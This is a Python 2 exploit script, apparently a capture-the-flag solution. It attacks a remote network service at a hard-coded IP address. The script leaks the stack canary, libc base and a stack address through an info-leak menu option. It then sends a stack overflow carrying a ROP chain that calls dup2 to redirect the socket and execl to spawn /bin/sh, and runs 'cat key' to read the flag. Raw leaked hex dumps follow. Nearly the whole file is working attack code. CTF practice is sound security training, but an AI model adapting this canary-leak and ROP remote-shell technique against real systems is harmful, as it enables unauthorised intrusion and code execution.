__author__ = 'HuyNA'
import os
import socket
import time
import struct
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Exploit 23.23.190.205:8888 and read flag.txt
host = "58.229.183.18"
local_host="192.168.248.157"
port = 8888
s.connect((host, port))
#s.connect((local_host, port))
def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf

data = recv_until(s, "fight!\n")
print data

time.sleep(0.02);
data = recv_until(s, "\n")  # Waiting 2 seconds...\n
print data
time.sleep(2);

# print menu ...
data = recv_until(s, ">")   # print menu

# leak info ....
def leak_info():
    send_data = "4\n"
    s.send(send_data)
    time.sleep(0.02)
    print s.recv(len("Are you sure? (y/n) "))
    send_data = "y"*10+"\n"
    s.send(send_data)
    time.sleep(0.02)
    #data = recv_until(s, ">")
    data = recv_until(s, "1111")
    a = len("You choose 'yyyyyyyyyy")
    data1 = data[a:a+40]


    print data1.encode("hex")
    libc_base = struct.unpack("<I", data1[8:12])[0] & 0xFFFF0000
    stack_base = struct.unpack("<I", data1[4:8])[0]
    stack_canary = struct.unpack("<I", data1[0:4])[0]
    print('stack canary = '+hex(stack_canary))
    print('libc base = '+hex(libc_base))
    print('stack address ='+hex(stack_base))

#leak_info()

send_data = "4\n"
s.send(send_data)
time.sleep(0.02)
print s.recv(len("Are you sure? (y/n) "))

stack_canary = 0x84c38b00
libc_base =  0xb763e8b3 - 0xE08B3 #0xb7e21000 #0xb7f00233 #0xb7e21000 #0xb7630000
stack_address = 0xbfb0a7d8

dup2_delta_2_15 = 0x000E11F0
dup_address = libc_base + dup2_delta_2_15
pop_pop_ret = 0x08048CD9
"""
.text:08048C62 13C C7 44 24 08 00 00 00 00         mov     dword ptr [esp+8], 0
.text:08048C6A 13C C7 44 24 04 0A 97 04 08         mov     dword ptr [esp+4], offset arg ; "sh"
.text:08048C72 13C C7 04 24 0D 97 04 08            mov     dword ptr [esp], offset path ; "/bin/sh"
.text:08048C79 13C E8 92 FA FF FF                  call    _execl                  ; Call Procedure
"""
execl_address = 0x08048C62

send_data = "y"*10
send_data += struct.pack("<I", stack_canary)
file_name = "key\x00"
send_data += file_name + "a"*(12 - len(file_name))
send_data += struct.pack("<I", dup_address)
send_data += struct.pack("<I", pop_pop_ret)
send_data += struct.pack("<I", 0x00000004)
send_data += struct.pack("<I", 0x00000000)
send_data += struct.pack("<I", dup_address)
send_data += struct.pack("<I", pop_pop_ret)
send_data += struct.pack("<I", 0x00000004)
send_data += struct.pack("<I", 0x00000001)
send_data += struct.pack("<I", dup_address)
send_data += struct.pack("<I", execl_address)
send_data += struct.pack("<I", 0x00000004)
send_data += struct.pack("<I", 0x00000002)
send_data += "\n"
s.send(send_data)

time.sleep(1)


s.send("cat key\n")

print s.recv(10240)
print s.recv(10240)

"""

0a8bc384
d8a7b0bf
b3e863b7    b763e8b3
e8a7b0bf
c5920408
042721

2
0a8bc384
d8a7b0bf
b3e863b7
e8a7b0bf
c5920408
0427210a

3 local
0a7871dd
28f2ffbf
3302f0b7
38f2ffbf
c5920408
0427210a31313131
"""